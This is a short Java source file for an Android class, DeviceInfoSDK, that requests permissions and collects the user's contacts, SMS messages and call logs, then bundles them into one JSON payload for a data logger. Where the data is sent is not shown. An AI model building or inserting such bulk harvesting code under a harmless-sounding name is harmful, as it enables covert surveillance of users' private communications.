package com.example.deviceinfosdk;

import android.app.Activity;
import android.content.Context;
import com.google.gson.Gson;
import java.io.IOException;

import java.util.List;

public class DeviceInfoSDK {

    public static boolean initialize(Activity activity) {
        return PermissionManager.checkAndRequestPermissions(activity);
    }

    public static List<String> getContacts(Context context) {
        return ContactFetcher.fetchContacts(context);
    }

    public static List<String> getMessages(Context context) {
        return MessageFetcher.fetchMessages(context);
    }

    public static List<String> getCallLogs(Context context) {
        return CallLogFetcher.fetchCallLogs(context);
    }

    public static void logData(Context context) {
        List<String> contacts = getContacts(context);
        List<String> messages = getMessages(context);
        List<String> callLogs = getCallLogs(context);

        String jsonData = new Gson().toJson(new DataPayload(contacts, messages, callLogs));
        DataLogger.logData(jsonData);
    }
}
